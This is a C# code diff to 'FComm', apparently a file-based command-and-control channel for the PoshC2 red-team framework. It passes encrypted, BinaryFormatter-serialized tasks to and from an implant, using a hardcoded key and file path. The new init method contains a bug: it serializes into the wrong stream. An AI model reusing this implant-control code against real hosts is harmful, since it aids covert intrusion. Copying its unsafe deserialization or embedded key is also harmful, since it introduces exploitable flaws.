@@ -15,6 +15,7 @@ using System.Runtime.Serialization.Formatters.Binary;
 
 namespace FComm
 {
+    [Serializable()]
     public class RHDataGram : ISerializable
     {
         public string PacketType { get; set; }
@@ -32,27 +33,6 @@ namespace FComm
             Actioned = false;
             Retrieved = false;
         }
-
-        /*  public RHDataGram(string packetType = "TASK", byte[] data = null)
-         {
-             this.packetType = packetType;
-             input = data;
-             output = "";
-             updateTime = DateTime.Now;
-             sent = false;
-             actioned = false;
-             retrieved = false;
-         }
-
-         public RHDataGram(string packetType = "INIT", string input = null, string output = null){
-             this.packetType = packetType;
-             this.input = input;
-             this.output = output;
-             this.updateTime = DateTime.Now;
-             this.sent = false;
-             this.actioned = false;
-             this.retrieved = false;
-         } */
 
         public override string ToString()
         {
@@ -153,12 +133,14 @@ namespace FComm
     {
         private static string FilePath;
         private static string Encryptionkey = "";
+        private static RHServer FComm;
         private static readonly object _lock = new object();
 
         public static void Main(string[] args)
         {
-            Start(args);
-            /*
+            //Start(args);
+            /*Start(new string[] {"Start","c:\\users\\public\\test.ost","c7P+slKaJuUuq06OUZnp4HFKOEsc+e86m24Lzzsqg+c="});
+            
             Start(new string[] { "Start", "ATHOMPSON", "msukpipereader", "mtkn4", "c7P+slKaJuUuq06OUZnp4HFKOEsc+e86m24Lzzsqg+c=" });
             Console.ReadLine();
             Start(new string[] { "foo" });
@@ -186,7 +168,7 @@ namespace FComm
             }
 
             Console.WriteLine($"[+] Connecting to: {FilePath} with key {Encryptionkey}");
-            RHServer FComm = new RHServer(FilePath); //create an object.
+            FComm = new RHServer(FilePath); //create an object.
             Running = true;
 
             var command = $"{string.Join(" ", args)}";
@@ -196,15 +178,55 @@ namespace FComm
                 Running = false;
                 //assume the kill command works - maybe need to remove the implant from poshc2?
             }
+            else if (command.ToLower().StartsWith("start"))
+            {
+                IssueCommand(FComm);
+            }
             else
             {
-                IssueCommand(command,FComm,Running);
+                IssueCommand(command, FComm, Running);
             }
         }
 
         /// <summary>
         /// Will issue the specified command to the pipe and read the response
         /// </summary>
+		public static void IssueCommand(RHServer FComm)
+        { //Overloaded method, just for init phase.
+            lock (_lock)
+            {
+                try
+                {
+                    byte[] DataToParseBytes = Decrypt(Encryptionkey, FComm.Receive());
+                    //Step 1: STREAM
+                    MemoryStream stream = new MemoryStream(DataToParseBytes);
+                    BinaryFormatter bf = new BinaryFormatter();
+                    //Step 2: DESERIALIZE!
+                    List<RHDataGram> DataToParse = (List<RHDataGram>)bf.Deserialize(stream);
+                    stream.Dispose();
+                    foreach (RHDataGram Task in DataToParse)
+                    {
+                        if (Task.PacketType == "INIT") // it's the initialisation data. I should do something with this during the connect phase.
+                        {
+                            Console.WriteLine(Task.Output);
+                            Task.Retrieved = true;
+                            continue;
+                        }
+                    }
+                    MemoryStream stream2 = new MemoryStream();
+                    bf.Serialize(stream, DataToParse);
+                    var DataToGo = Encrypt(Encryptionkey, null, false, stream2.ToArray()); //list is encrypted.
+                    stream.Dispose();
+                    //Send the DATAAAAAAAAAHH!!!
+                    FComm.SendData(DataToGo);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine($"[-] Error in FComm Initialisation!!: {e.Message}");
+                    Console.WriteLine($"[-] {e.StackTrace}");
+                }
+            }
+        }
         public static void IssueCommand(string command, RHServer FComm, bool Running)
         {
             // Lock this so only one thread can read/write to the pipe at a time
@@ -226,10 +248,10 @@ namespace FComm
                         //Step 2: DESERIALIZE!
                         List<RHDataGram> DataToParse = (List<RHDataGram>)bf.Deserialize(stream);
                         stream.Dispose();
-                        
+
                         foreach (RHDataGram Task in DataToParse)
                         {
-                            if (Task.PacketType == "INIT") // it's the initialisation data.
+                            if (Task.PacketType == "INIT") // it's the initialisation data. I should do something with this during the connect phase.
                             {
                                 Console.WriteLine(Task.Output);
                                 Task.Retrieved = true;
@@ -239,6 +261,7 @@ namespace FComm
                             {
                                 Console.WriteLine(Task.Output);
                                 Task.Retrieved = true;
+                                Running = false;
                             }
                             if (taskAdded == false) // Shonky Ghetto Code just so we don't add endless copies of the same command.
                             {
@@ -272,13 +295,13 @@ namespace FComm
             {
                 var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV));
                 var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
-                return decrypted.Where(x => x > 0).ToArray();
+                return decrypted.ToArray();
             }
             catch
             {
                 var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV), false);
                 var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
-                return decrypted.Where(x => x > 0).ToArray();
+                return decrypted.ToArray();
             }
             finally
             {
